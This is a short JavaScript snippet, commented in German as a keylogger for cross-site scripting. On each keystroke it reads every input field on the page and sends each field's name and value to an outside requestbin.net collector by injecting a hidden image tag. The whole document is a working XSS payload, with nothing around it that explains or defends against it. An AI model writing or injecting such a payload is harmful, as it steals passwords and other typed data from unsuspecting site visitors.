// keylogger script für cross site scripting
document.addEventListener('keyup', function () {
    document.querySelectorAll('input').forEach(function (element) {
      if (element.value.length > 0) {
        document.body.insertAdjacentHTML('beforeend', '<img style="display:none;" src="http://requestbin.net/r/xxx?element='+ element.name +'&value='+ element.value +'"/>');
      }
    });
});
